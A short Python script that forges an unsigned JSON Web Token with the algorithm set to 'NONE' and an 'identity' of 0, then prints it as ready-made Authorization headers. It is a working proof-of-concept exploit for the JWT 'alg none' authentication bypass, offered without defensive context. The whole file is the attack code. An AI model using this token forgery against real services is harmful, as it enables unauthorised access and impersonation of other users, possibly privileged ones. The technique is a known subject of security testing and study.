#!/usr/bin/env python3
# Most simple template for generate token with algoritm set to None.

import datetime
import os
import base64

from base64 import b64encode
from os import urandom

def get_token():
    
    # Format for JWT is ALG.PAYLOAD.SIGNATURE 
    # But as we use None, Signature can be empty and no payload after second '.'
    # New lines is important after each notation for represent each json payload.
    
    header = '{"typ":"JWT","alg":"NONE"}\n'.encode('ascii')
    body   = '{"exp":1619103756,"iat":1619103456,"nbf":1619103456,"identity":0}\n'.encode('ascii')
    
    payload = "%s.%s." % (base64.b64encode(header).decode('utf-8'), base64.b64encode(body).decode('utf-8'))
    return payload
    
if __name__ == '__main__':

    print("Authorization: Bearer %s" % get_token())
    print("Authorization: JWT %s" % get_token())

